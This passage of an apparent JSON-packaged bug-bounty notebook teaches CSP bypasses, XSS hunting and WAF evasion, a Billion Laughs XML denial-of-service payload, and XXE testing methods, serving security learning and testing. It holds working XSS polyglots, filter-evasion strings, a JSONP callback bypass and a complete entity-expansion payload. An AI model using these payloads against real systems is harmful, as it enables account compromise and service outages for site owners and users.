      "Bypass_CSP.md": "\r\n#### What is CSP?\r\n\r\nCSP stands for `Content Security Policy` which is a mechanism to define which resources can be fetched out or executed by a web page. In other words, it can be understood as a policy that decides which scripts, images, iframes can be called or executed on a particular page from different locations. Content Security Policy is implemented via response headers or meta elements of the HTML page. From there, it’s browser’s call to follow that policy and actively block violations as they are detected.\r\n\r\n#### How does it work?\r\n\r\nCSP works by restricting the origins that active and passive content can be loaded from. It can additionally restrict certain aspects of active content such as the execution of inline JavaScript, and the use of eval().\r\n\r\n#### Defining Resources\r\n\r\n```\r\ndefault-src 'none';\r\nimg-src 'self';\r\nscript-src 'self' https://code.jquery.com;\r\nstyle-src 'self';\r\nreport-uri /__cspreport__\r\nfont-src 'self' https://addons.cdn.mozilla.net;\r\nframe-src 'self' https://ic.paypal.com https://paypal.com;\r\nmedia-src https://videos.cdn.mozilla.net;\r\nobject-src 'none';\r\n```\r\n#### Some defining resources\r\n\r\n_Some definitions_\r\n\r\n1. **script-src:** This directive specifies allowed sources for JavaScript. This includes not only URLs loaded directly into  elements, but also things like inline script event handlers (onclick) and XSLT stylesheets which can trigger script execution. \r\n2. **default-src:** This directive defines the policy for fetching resources by default. When fetch directives are absent in CSP header the browser follows this directive by default.\r\n3. **Child-src:** This directive defines allowed resources for web workers and embedded frame contents. \r\n4. **connect-src:** This directive restricts URLs to load using interfaces like ,fetch,websocket,XMLHttpRequest \r\n5. **frame-src:** This directive restricts URLs to which frames can be called out. \r\n6. **frame-ancestors:** This directive specifies the sources that can embed the current page. This directive applies to , , , and  tags. This directive can't be used in  tags and applies only to non-HTML resources. \r\n7. **img-src:** It defines allowed sources to load images on the web page. \r\n8. **Manifest-src:** This directive defines allowed sources of application manifest files. \r\n9. **media-src:** It defines allowed sources from where media objects like , and  can be loaded. \r\n10. **object-src:** It defines allowed sources for the , and  elements.\r\n11. **base-uri:** It defines allowed URLs which can be loaded using  element. \r\n12. **form-action:** This directive lists valid endpoints for submission from  tags.\r\n13. **plugin-types:** It defineslimits the kinds of mime types a page may invoke. \r\nupgrade-insecure-requests: This directive instructs browsers to rewrite URL schemes, changing HTTP to HTTPS. This directive can be useful for websites with large numbers of old URL's that need to be rewritten.\r\n14. **sandbox:** sandbox directive enables a sandbox for the requested resource similar to the  sandbox attribute. It applies restrictions to a page's actions including preventing popups, preventing the execution of plugins and scripts, and enforcing a same-origin policy.\r\n\r\n\r\n\r\n### Basic CSP Bypass\r\n\r\nThere are quit a few ways to mess up your implementation of CSP. One of the easiest ways to misconfigure CSP is to use dangerous values when setting policies. For example suppose you have the following CSP header:\r\n\r\n```default-src 'self' *```\r\n\r\nAs you know the default-src policy acts a catch all policy. You also know that * acts as a wild card. So this policy is basically saying allow any resources to be loaded. Its the same thing as not having a CSP header! You should always look out for wildcard permissions.\r\n\r\nLets look at another CSP header:\r\n```\r\nscript-src 'unsafe-inline' 'unsafe-eval' 'self' data: https://www.google.com http://www.google-analytics.com/gtm/js  https://*.gstatic.com/feedback/ https://accounts.google.com;\r\n```\r\n\r\nHere we have the policy script-src which we know is used to define where we can load javascript files from. Normally things like ***<IMG SRC=”javascript:alert(‘XSS’);”>*** would be blocked but due to the value ‘unsafe-inline’ this will execute. This is something you always want to look out for as it is very handy as an attacker.\r\n\r\nYou can also see the value data: this will allow you to load javascript if you have the data: element as shown below: <iframe/src=”data:text/html,<svg onload=alert(1)>”>.\r\n\r\nSo far all of the techniques used to bypass CSP have been due to some misconfiguration or abusing legitimate features of CSP. There are also a few other techniques which can be used to bypass the CSP.\r\n\r\n### JSONP CSP Bypass\r\n\r\nIf you don’t know what JSONP is you might want to go look at a few tutorials on that topic but ill give you a brief overview. JSONP is a way to bypass the same object policy (SOP). A JSONP endpoint lets you insert a javascript payload , normally in a GET parameter called “callback” and the endpoint will then return your payload back to you with the content type of JSON allowing it to bypass the SOP. Basically we can use the JSONP endpoint to serve up our javascript payload. You can find an example below:\r\n```\r\nhttps://accounts.google.com/o/oauth2/revoke?callback=alert(1337)\r\n```\r\n\r\nAs you can see above we have our alert function being displayed on the page.\r\n\r\nThe danger comes in when a CSP header has one of these endpoints whitelisted in the script-src policy. This would mean we could load our malicious javascript via the JSONP endpoint bypassing the CSP policy.\r\n\r\nLook at the following CSP header:\r\n```\r\nscript-src https://www.google.com http://www.google-analytics.com/gtm/js  https://*.gstatic.com/feedback/ https://accounts.google.com;\r\n```\r\nThis would get blocked by the CSP\r\n\r\n```something.example.com?vuln_param=javascript:alert(1);```\r\n\r\nThis would pass because accounts.google.com is allowed to load javascript files. However, we are abusing the JSONP feature to load our malicious javascript.\r\n\r\n```something.example.com?vuln_param=https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)```\r\n\r\n#### CSP Injection Bypass\r\n\r\nThe third type of CSP bypass is called CSP injection. This occurs when user supplied input is reflected in the CSP header. Suppose you have the following url:\r\n\r\n```example.com?vuln=something_vuln_csp```\r\n\r\n-> If your input is reflected in the CSP header you should have somthing like this.\r\n\r\n```\r\nscript-src something_vuln_csp;\r\nobject-src 'none';\r\nbase-uri 'none';\r\nrequire-trusted-types-for 'script';\r\nreport-uri https://csp.example.com;\r\n```\r\n\r\nThis means we can control what value the script-src value is set to. We can easily bypass the CSP by setting this value to a domain we control.\r\n\r\n## Author:\r\n* [@harsha0x01](https://twitter.com/harsha0x01)\r\n"
    },
    {
      "Xss.md": "# Reflected Xss Methods\r\nMany methods out in wild but here are few most common , but not limited.\r\n\r\nOne Awesome mind map for approach to reflected xss can be found here [https://github.com/A9HORA/Reflected-XSS-Mindmap](https://github.com/A9HORA/Reflected-XSS-Mindmap) Made By [@A9HORA](https://twitter.com/A9HORA)\r\n\r\n***Tip: While using other methods put method 2 in background in terminal or on vps***\r\n\r\n### 1. Using Burp\r\n 1. Download Reflection and sentinal plugin for burp.\r\n 2. Walk and spider the target site.\r\n 3. Check the reflected params tab in burp\r\n 4. send that sentinal or check manually.\r\n \r\n### 2. Using Waybackurls and other similar site\r\n 1. Use [Gau](https://github.com/lc/gau) or [Wayback urls](https://github.com/tomnomnom/waybackurls) to passively gather urls of the target.\r\n 2. Filter the parameters using `grep \"=\"` or gf patterns and store it in a new file.\r\n 3. Now run [Gxss](https://github.com/KathanP19/Gxss) or [bxss](https://github.com/ethicalhackingplayground/bxss/) on that new file.\r\n 4. Check Reflected Param Manually or use some tool like [dalfox](https://github.com/hahwul/dalfox) \r\n\r\n### 3. Using Google Dorks\r\n 1. Using Google Dork `site:target.com` filter the result\r\n 2. Now search for links which have params by adding more dorks something like `site:target.com inurl:\".php?\"` or `site:target.com filetype:php` etc\r\n    you can find some dorks at this link [https://www.openbugbounty.org/blog/devl00p/top-100-xss-dorks/](https://www.openbugbounty.org/blog/devl00p/top-100-xss-dorks/) or google it out.\r\n 3. Check if the param value is getting reflected in html source code \r\n 4. Try Xss payload there or pass it to some tool\r\n \r\n### 4. Find Hidden Variables In Source Code.\r\n 1. Check Javascript file or html Source file for hidden or unused variables \r\n 2. You can Manually Check Right Click View Page Source and search for `var=` , `=\"\"` , `=''`.\r\n 3. Now Append that to webpage urls. For example `https://example.com?hiddenvariablename=xss`.\r\n \r\n### 5. Other Methods\r\n 1. Use Methods 1 or 2 to Gather the urls\r\n 2. Enumerate the Firewall using [https://github.com/Ekultek/WhatWaf](https://github.com/Ekultek/WhatWaf) or other similar tool.\r\n 3. Find WAF bypass payload on twitter by searching or in this Github Repo [https://github.com/0xInfection/Awesome-WAF](https://github.com/0xInfection/Awesome-WAF)\r\n 4. Also Use [Arjun](https://github.com/s0md3v/Arjun) to find hidden params.\r\n\r\n*Tips*\r\n- Check the error pages (404,403,..) sometimes they contain reflected values\r\n\t- Trigger a 403 by trying to get the .htaccess file\r\n- Try every reflected parameter\r\n\r\n*Video's*\r\n- https://www.youtube.com/watch?v=wuyAY3vvd9s\r\n- https://www.youtube.com/watch?v=GsyOuQBG2yM\r\n- https://www.youtube.com/watch?v=5L_14F-uNGk\r\n- https://www.youtube.com/watch?v=N3HfF6_3k94\r\n \r\n# Stored Xss Methods\r\nStored Xss are mostly found manually\r\n 1. Enumerate the Firewall using above Methods and select a payload to test accordingly.\r\n 2. Try that selected WAF bypass payload while registering on a site in fields like username, name, address, email, etc.\r\n 3. Try Payload in File name of profile picture and also in the source file of image.\r\n 4. Try in Comment section anywhere on target site.\r\n 5. Try on every input fields which get reflected in page and which can be seen by other users.\r\n 6. Try to signup using your name + xss payload and that can lead to stored xss.\r\n*Tips*\r\n- For every input field\r\n\t- Try to get ```<a href=#>test</a>``` an entity in\r\n\t- Try to get an obfuscated entity in\r\n\t- If it catches on anything, go deeper\r\n\r\n*Video's*\r\n- https://www.youtube.com/watch?v=uHy1x1NkwRU\r\nWriteup:\r\n-https://medium.com/@fatin151485/how-i-found-my-first-stored-xss-on-popular-eboighar-com-6bd497b0bb96\r\n\r\n# Blind Xss\r\nSimilar to Reflected Xss Or Stored Xss But you Dont get any reflection, but you get response on you server.\r\n\r\n 1. Similar methods As given above except try putting payload which can give a callback on your server when executed.\r\n 2. You can Used [https://xsshunter.com/](https://xsshunter.com/) or Use burpcollaborator or ngrok.\r\n 3. Try it on contact forms or similar functionality.\r\n\r\n*Tips*\r\n- Copy every payload from your xsshunter payloads section and paste it into every field you see\r\n- XSS hunter contains a payload for CSP bypass\r\n- Generate some variations of your payloads (example replace < with `&lt;`)\r\n\r\n### Where to look for Blind XSS……\r\n```\r\n1- Review forms\r\n2- Contact Us pages\r\n3- Passwords(You never know if the other side doesn’t properly handle input and if your password is in View mode)\r\n4- Address fields of e-commerce sites\r\n5- First or Last Name field while doing Credit Card Payments\r\n6- Set User-Agent to a Blind XSS payload. You can do that easily from a proxy such as Burpsuite.\r\n7- Log Viewers\r\n8- Feedback Page\r\n9- Chat Applications\r\n10- Any app that requires user moderation\r\n```\r\n\r\n# DOM XSS\r\n\r\n*Tips*\r\n- Would not recommend manually looking for DOM XSS\r\n- Burp suite PRO scanner can find DOM XSS\r\n- Tool: https://github.com/dpnishant/ra2-dom-xss-scanner\r\n\r\n*Video's*\r\n- https://www.youtube.com/watch?v=gBqzzhgHoYg\r\n- https://www.youtube.com/watch?v=WclmtS8Ftc4\r\n\r\n# XSS filter evasion tips\r\n\r\n*Tips*\r\n- < and > can be replace with html entities `&lt;` and `&gt;`\r\n- You can try an XSS polyglot\r\n\t- ```javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>```\r\n\t- https://gist.github.com/michenriksen/d729cd67736d750b3551876bbedbe626\r\n\t\r\n### XSS Firewall Bypass Techniques\r\n\r\n* Check if the firewall is blocking only lowercase\r\n```\r\nEx:- <scRipT>alert(1)</scRipT>\r\n```\r\n* Try to break firewall regex with the  new line(\\r\\n)\r\n```\r\nEx:- <script>%0alert(1)</script>\r\n```\r\n* Try Double Encoding\r\n```\r\nEx:- %2522\r\n```\r\n* Testing for recursive filters, if firewall removes text in red, we will have clear payload\r\n```\r\nEx:- <src<script>ipt>alert(1);</scr</script>ipt>\r\n```\r\n* Injecting anchor tag without whitespaces\r\n```\r\nEx:- <a/href=\"j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;\">\r\n```\r\n* Try to bypass whitespaces using Bullet\r\n```\r\nEx:- <svg•onload=alert(1)>\r\n```\r\n* Try to change request method\r\n```\r\nEx:- GET /?q=xss  POST/\r\n                  q=xss\r\n```\r\n* Try CRLF Inection\r\n```\r\nEx:- GET /%0A%ODValue=%20Virus\r\n     POST \r\n     Value= Virus\r\n ```\r\n## Thanks To\r\n* [The XSS rat](https://www.youtube.com/channel/UCjBhClJ59W4hfUly51i11hg)\r\n* [sratarun](https://twitter.com/sratarun)\r\n\r\n## Reference\r\n* [https://github.com/heilla/SecurityTesting/blob/master/HuntingCheckList.md](https://github.com/heilla/SecurityTesting/blob/master/HuntingCheckList.md)\r\n\r\n### Authors\r\n* [@KathanP19](https://twitter.com/KathanP19)\r\n* [@harsha0x01](https://twitter.com/harsha0x01)\r\n"
    },
    {
      "XSS_Bypass.md": "# XSS Filters Bypass.\r\n\r\nif You Are a Beginner then First Clear the Basic Concepts .\r\n\r\n\r\n* ```alert()``` Alternatives\r\n```\r\n   1)Use confirm() Not alert()\r\n   2)Use prompt() Not alert()\r\n   3)Use console.log() Not alert()\r\n   4)use eval() Not alert()\r\n```\r\n\r\n* ```onerror``` Event Handler Alternatives\r\n```\r\n   1)Use onload\r\n   2)Use onfocus\r\n   3)Use onmouseover\r\n   4)Use onblur\r\n   5)Use onclick\r\n   6)Use onscroll   \r\n```\r\n* Note:- if () get filtered then Use \\`\\` Rather then () , Some Examples Are Below.\r\n\r\n```\r\n   1)<script>alert`1`</script>\r\n   2)<img src=x onerror=alert`1`>\r\n   3)<img src=x onerror=prompt`1`>\r\n   4)javascript:prompt`1`\r\n   5)javascript:alert`1`\r\n```\r\n## Resources\r\n- 1:-[Portswigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)\r\n- 2:-[OWASP](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)\r\n\r\n## Twitter:[Fani Malik](https://twitter.com/fanimalikhack/)\r\n"
    }
  ],
  "XXE": [
    {
      "Billion_Laugh_Attack.md": "# Billion Laugh Attack\r\n- Another common vulnerability associated with XML parsing is called A Billion Laughs Attack. It uses an entity to resolve itself cyclically thereby consuming more CPU usage and causing a denial of service attack. An Example XML payload that can cause an XXE attack is as follows:\r\n\r\n```\r\nStep 1 : Capture the request into Burp\r\nStep 2 : Send it to the repeater tab and then convert the body into XML whether it is accepting or not\r\nStep 3 : To confirm, Check for the [ Accept ] Header change it into Application/json\r\nStep 4 : Covert JSON into XML if their is no Possibility\r\nStep 5 : Add the payload in between and change the content lol1 to lol9 depending on the dos variation in the xml field!\r\n```\r\n\r\n- Billion Laugh Payload :\r\n```\r\n<?xml version=\"1.0\"?>\r\n<!DOCTYPE lolz [\r\n <!ENTITY lol \"lol\">\r\n <!ELEMENT lolz (#PCDATA)>\r\n <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\r\n <!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\r\n <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\r\n <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\r\n <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\r\n <!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\r\n <!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\r\n <!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\r\n <!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\r\n]>\r\n<lolz>&lol9;</lolz> \r\n```\r\n\r\n## Contributor:\r\n- [N3T_hunt3r](https://twitter.com/N3T_hunt3r)\r\n"
    },
    {
      "XXE_Methods.md": "# XML External Entities.\r\nThese are my methods to check and hunt for XML External Entities.\r\nI might be missing a lot of things but as the community believe in \"sharing is caring\" by @CXVVMVII.\r\n\r\n## Methods\r\n1. Convert the content type from \"application/json\"/\"application/x-www-form-urlencoded\" to \"applcation/xml\".\r\n2. File Uploads allows for docx/xlcs/pdf/zip , unzip the package and add your evil xml code into the xml files.\r\n3. If svg allowed in picture upload , you can inject xml in svgs.\r\n4. If the web app offers RSS feeds , add your milicious code into the RSS.\r\n5. Fuzz for /soap api , some applications still running soap apis\r\n6. If the target web app allows for SSO integration, you can inject your milicious xml code in the SAML request/reponse\r\n\r\n## Twitter:\r\n* [whitechaitai](https://twitter.com/whitechaitai)\r\n"
    }
  ]
}